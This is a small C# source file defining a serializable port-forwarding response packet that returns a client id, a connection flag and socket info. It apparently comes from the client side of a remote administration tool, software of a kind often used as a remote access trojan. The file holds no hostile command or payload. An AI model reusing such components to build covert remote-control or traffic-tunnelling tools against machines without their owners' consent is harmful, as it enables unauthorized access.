using System;
using xClient.Core.Networking;
using xClient.Core.Packets;

namespace xClient.Core.PortForward.Local.Packets
{
    [Serializable]
    public class LocalPortForwardConnectResponse : IPacket
    {
        public int ClientId { get; set; }

        public bool Connected { get; set; }

        public string SocketInfo { get; set; }

        public LocalPortForwardConnectResponse()
        {

        }

        public LocalPortForwardConnectResponse(int id, bool isConnected, string socketInfo)
        {
            this.ClientId = id;
            this.Connected = isConnected;
            this.SocketInfo = socketInfo;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}